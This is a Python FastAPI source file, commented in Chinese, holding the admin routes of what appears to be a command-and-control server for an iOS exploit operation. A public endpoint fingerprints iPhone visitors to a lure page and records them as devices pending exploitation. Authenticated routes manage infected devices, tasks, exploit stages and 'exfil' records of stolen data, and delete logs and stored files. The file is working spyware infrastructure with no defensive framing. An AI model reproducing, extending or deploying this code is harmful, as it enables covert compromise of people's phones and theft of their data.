"""管理员 API 路由"""

from fastapi import APIRouter, Depends, HTTPException, status, Body, Request
from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm
from sqlalchemy import desc
from sqlalchemy.orm import Session
from typing import List
from datetime import datetime, timedelta
from jose import JWTError, jwt

from database import get_db
import crud, schemas
from models import Device, Exfil, Task
from config import get_config
from api.websocket import sse_manager

config = get_config()
router = APIRouter(prefix="/api/admin", tags=["admin"])

# OAuth2 配置
oauth2_scheme = OAuth2PasswordBearer(tokenUrl="/api/admin/login")


def create_access_token(data: dict):
    """创建访问令牌"""
    to_encode = data.copy()
    expire = datetime.utcnow() + timedelta(minutes=config.ACCESS_TOKEN_EXPIRE_MINUTES)
    to_encode.update({"exp": expire})
    encoded_jwt = jwt.encode(to_encode, config.SECRET_KEY, algorithm=config.ALGORITHM)
    return encoded_jwt


def verify_token(token: str):
    """验证令牌"""
    try:
        payload = jwt.decode(token, config.SECRET_KEY, algorithms=[config.ALGORITHM])
        return payload
    except JWTError:
        return None


def get_current_admin(token: str = Depends(oauth2_scheme)):
    """获取当前管理员"""
    credentials_exception = HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Could not validate credentials",
        headers={"WWW-Authenticate": "Bearer"},
    )
    
    payload = verify_token(token)
    if payload is None:
        raise credentials_exception
    
    return payload


@router.post("/login")
def login(form_data: OAuth2PasswordRequestForm = Depends()):
    """
    管理员登录认证
    返回访问令牌
    """
    if form_data.username != config.ADMIN_USER or form_data.password != config.ADMIN_PASS:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Incorrect username or password",
            headers={"WWW-Authenticate": "Bearer"},
        )
    
    access_token = create_access_token(data={"sub": form_data.username})
    return {
        "access_token": access_token,
        "token_type": "bearer",
        "username": form_data.username
    }


# 访问日志存储 (内存缓存 - 仅用于实时显示)
access_logs = []

def parse_ios_info(user_agent: str):
    """从 User-Agent 解析 iOS 设备信息"""
    import re
    info = {
        "ios_version": None,
        "device_model": "Unknown",
        "chipset": None
    }
    
    # 匹配 iOS 版本: iPhone OS 18_7 -> 18.7
    match = re.search(r'iPhone OS (\d+)[_]?(\d*)', user_agent)
    if match:
        major = match.group(1)
        minor = match.group(2) if match.group(2) else "0"
        info["ios_version"] = f"{major}.{minor}"
    
    # 匹配设备型号
    if "iPhone" in user_agent:
        # 尝试匹配具体型号
        model_match = re.search(r'iPhone\s*([\w\s]+?)(?:\s+|$|,)', user_agent)
        if model_match:
            info["device_model"] = "iPhone " + model_match.group(1).strip()
        else:
            info["device_model"] = "iPhone"
    
    # 根据 iOS 版本估算芯片
    if info["ios_version"]:
        ver = float(info["ios_version"].split(".")[0])
        if ver >= 17:
            info["chipset"] = "A17/A18"
        elif ver >= 15:
            info["chipset"] = "A15/A16"
        elif ver >= 13:
            info["chipset"] = "A13/A14"
    
    return info


# 公开的访问日志记录端点 (不需要认证)
@router.post("/logs/record")
async def record_access(request: Request, db: Session = Depends(get_db)):
    """
    记录访问日志 - 公开端点
    group.html 页面加载时调用
    同时创建或更新设备记录
    """
    # 尝试从请求体或 headers 中获取 user-agent
    user_agent = request.headers.get("user-agent", "")
    
    # 尝试解析 JSON body
    try:
        body = await request.json()
        if isinstance(body, dict):
            user_agent = body.get("userAgent", user_agent)
    except:
        pass
    
    # 保存到数据库
    try:
        crud.create_access_log(
            db=db,
            ip=request.client.host,
            user_agent=user_agent,
            referer=request.headers.get("referer", ""),
            path="/group.html",
            method="POST"
        )
    except Exception as e:
        print(f"Error saving access log: {e}")
    
    # 尝试从 User-Agent 解析 iOS 设备信息并创建设备记录
    if "iPhone" in user_agent or "iPad" in user_agent or "iPod" in user_agent:
        try:
            ios_info = parse_ios_info(user_agent)
            
            # 生成设备 UUID (基于 IP + User-Agent 的简单哈希)
            import hashlib
            unique_str = f"{request.client.host}:{user_agent}"
            device_uuid = hashlib.md5(unique_str.encode()).hexdigest()[:32]
            
            # 检查设备是否已存在
            existing_device = crud.get_device(db, device_uuid)
            
            if not existing_device:
                # 创建设备记录 (待利用状态)
                from schemas import DeviceRegister
                device_data = DeviceRegister(
                    device_uuid=device_uuid,
                    device_model=ios_info["device_model"],
                    ios_version=ios_info["ios_version"],
                    user_agent=user_agent
                )
                device = crud.create_device(db, device_data, ip=request.client.host)
                db.commit()
            else:
                crud.update_device_status(db, device_uuid, "online")
        except Exception as e:
            print(f"Error saving device: {e}")
    
    # 推送到 SSE 实时监视器
    try:
        await sse_manager.publish("access", {
            "ip": request.client.host,
            "user_agent": user_agent[:200],
            "referer": request.headers.get("referer", ""),
            "timestamp": datetime.utcnow().isoformat()
        })
    except Exception:
        pass

    # 同时保存到内存缓存
    log_entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "ip": request.client.host,
        "user_agent": user_agent,
        "referer": request.headers.get("referer", ""),
        "path": "/group.html",
        "method": "POST"
    }
    
    access_logs.append(log_entry)
    
    # 只保留最近 1000 条
    if len(access_logs) > 1000:
        access_logs.pop(0)
    
    return {"ok": True, "logged": True}


@router.delete("/logs/access")
def delete_access_logs(
    ids: str = None,  # 逗号分隔的ID列表，如 "1,2,3"
    admin: dict = Depends(get_current_admin),
    db: Session = Depends(get_db)
):
    """
    删除访问日志
    - 如果指定IDs，则删除指定日志
    - 如果不指定，则清空所有访问日志
    """
    if ids:
        try:
            log_ids = [int(x.strip()) for x in ids.split(',') if x.strip().isdigit()]
            count = crud.delete_access_logs(db, log_ids)
        except Exception as e:
            raise HTTPException(status_code=400, detail=f"删除失败: {str(e)}")
    else:
        count = crud.delete_access_logs(db)
    
    return {"ok": True, "deleted": count}


@router.get("/logs/access")
def get_access_logs(
    limit: int = 100,
    admin: dict = Depends(get_current_admin),
    db: Session = Depends(get_db)
):
    """
    获取访问日志
    """
    logs = access_logs[-limit:] if len(access_logs) > limit else access_logs
    return {
        "ok": True,
        "total": len(access_logs),
        "logs": logs
    }


@router.get("/stats", response_model=schemas.AdminStats)
def get_stats(admin: dict = Depends(get_current_admin), db: Session = Depends(get_db)):
    """
    获取仪表盘统计数据
    包括设备、任务、外泄数据等统计信息
    """
    return crud.get_admin_stats(db)


@router.get("/devices", response_model=List[schemas.DeviceOut])
def list_all_devices(
    skip: int = 0, 
    limit: int = 100, 
    status: str = None,
    admin: dict = Depends(get_current_admin), 
    db: Session = Depends(get_db)
):
    """获取所有设备列表（管理员）"""
    if status:
        devices = db.query(Device).filter(
            Device.status == status
        ).order_by(desc(Device.last_seen)).offset(skip).limit(limit).all()
        return devices
    return crud.get_devices(db, skip=skip, limit=limit)


@router.get("/devices/{device_uuid}/detail")
def get_device_detail(
    device_uuid: str,
    admin: dict = Depends(get_current_admin), 
    db: Session = Depends(get_db)
):
    """获取设备详细信息（管理员）"""
    device = crud.get_device(db, device_uuid)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    # 获取设备统计数据
    data_counts = crud.get_device_data_counts(db, device_uuid)
    
    # 获取最近任务
    recent_tasks = crud.get_device_tasks(db, device_uuid, skip=0, limit=10)
    
    # 获取最近外泄数据
    recent_exfil = crud.get_device_exfil(db, device_uuid, skip=0, limit=10)
    
    # 获取最近日志
    recent_logs = crud.get_device_logs(db, device_uuid, skip=0, limit=20)
    
    return {
        "device": device,
        "data_counts": data_counts,
        "recent_tasks": recent_tasks,
        "recent_exfil": recent_exfil,
        "recent_logs": recent_logs
    }


@router.get("/logs/{device_uuid}", response_model=List[schemas.DeviceLogOut])
def get_device_logs_admin(
    device_uuid: str,
    skip: int = 0, 
    limit: int = 100,
    admin: dict = Depends(get_current_admin), 
    db: Session = Depends(get_db)
):
    """获取指定设备日志（管理员）"""
    return crud.get_device_logs(db, device_uuid, skip=skip, limit=limit)


@router.get("/logs")
def get_all_logs(
    skip: int = 0, 
    limit: int = 500,
    admin: dict = Depends(get_current_admin), 
    db: Session = Depends(get_db)
):
    """获取所有日志（管理员）- 以设备执行日志为主"""
    # 设备执行日志优先，默认拉更多条，避免被 access 日志冲掉
    access_logs_db = crud.get_access_logs(db, skip=0, limit=min(50, limit))
    device_logs_db = crud.get_all_logs(db, skip=skip, limit=limit)
    
    # 合并日志（类型标记）
    combined = []
    
    # 添加访问日志
    for log in access_logs_db:
        combined.append({
            "id": f"access_{log.id}",
            "type": "access",
            "timestamp": log.created_at.isoformat() if log.created_at else "",
            "ip": log.ip,
            "user_agent": log.user_agent or "",
            "path": log.path,
            "method": log.method,
        })
    
    # 添加设备日志
    for log in device_logs_db:
        combined.append({
            "id": f"db_{log.id}",
            "type": "device",
            "timestamp": log.created_at.isoformat() if log.created_at else "",
            "device_uuid": log.device_uuid,
            "stage": log.stage,
            "message": log.message,
            "log_level": log.log_level,
        })
    
    # 按时间倒序排序
    combined.sort(key=lambda x: x["timestamp"], reverse=True)
    
    return combined[:limit]


@router.get("/exfil/{device_uuid}", response_model=List[schemas.ExfilOut])
def get_device_exfil_admin(
    device_uuid: str,
    skip: int = 0, 
    limit: int = 100,
    admin: dict = Depends(get_current_admin), 
    db: Session = Depends(get_db)
):
    """获取指定设备外泄数据（管理员）"""
    return crud.get_device_exfil(db, device_uuid, skip=skip, limit=limit)


@router.get("/exfil", response_model=List[schemas.ExfilOut])
def get_all_exfil(
    skip: int = 0, 
    limit: int = 100,
    category: str = None,
    admin: dict = Depends(get_current_admin), 
    db: Session = Depends(get_db)
):
    """获取所有外泄数据（管理员）"""
    if category:
        return crud.get_exfil_by_category(db, category, skip=skip, limit=limit)
    return crud.get_exfil(db, skip=skip, limit=limit)


@router.get("/tasks", response_model=List[schemas.TaskOut])
def get_all_tasks_admin(
    skip: int = 0, 
    limit: int = 100,
    status: str = None,
    admin: dict = Depends(get_current_admin), 
    db: Session = Depends(get_db)
):
    """获取所有任务列表（管理员）"""
    if status:
        tasks = db.query(Task).filter(
            Task.status == status
        ).order_by(desc(Task.created_at)).offset(skip).limit(limit).all()
        return tasks
    
    return db.query(Task).order_by(desc(Task.created_at)).offset(skip).limit(limit).all()


@router.delete("/devices/{device_uuid}")
def delete_device_admin(
    device_uuid: str,
    admin: dict = Depends(get_current_admin), 
    db: Session = Depends(get_db)
):
    """删除设备（管理员）"""
    if crud.delete_device(db, device_uuid):
        return {"ok": True, "message": "Device deleted"}
    raise HTTPException(status_code=404, detail="Device not found")


@router.delete("/tasks/{task_id}")
def delete_task_admin(
    task_id: int,
    admin: dict = Depends(get_current_admin), 
    db: Session = Depends(get_db)
):
    """删除任务（管理员）"""
    if crud.delete_task(db, task_id):
        return {"ok": True, "message": "Task deleted"}
    raise HTTPException(status_code=404, detail="Task not found")


@router.delete("/exfil/{exfil_id}")
def delete_exfil_admin(
    exfil_id: int,
    admin: dict = Depends(get_current_admin), 
    db: Session = Depends(get_db)
):
    """删除外泄数据（管理员）"""
    exfil = db.query(Exfil).filter(Exfil.id == exfil_id).first()
    
    if not exfil:
        raise HTTPException(status_code=404, detail="Exfil record not found")
    
    # 删除文件
    import os
    if exfil.file_path and os.path.exists(exfil.file_path):
        try:
            os.remove(exfil.file_path)
        except Exception:
            pass
    
    # 删除记录
    db.delete(exfil)
    db.commit()
    
    return {"ok": True, "message": "Exfil record deleted"}


@router.get("/config")
def get_config_info(admin: dict = Depends(get_current_admin)):
    """获取配置信息（管理员）"""
    return {
        "server_url": config.CORUNA_SERVER_URL,
        "supported_versions": config.SUPPORTED_IOS_VERSIONS,
        "exploit_stages": config.EXPLOIT_STAGES,
        "task_timeout": config.TASK_TIMEOUT,
        "heartbeat_interval": config.HEARTBEAT_INTERVAL
    }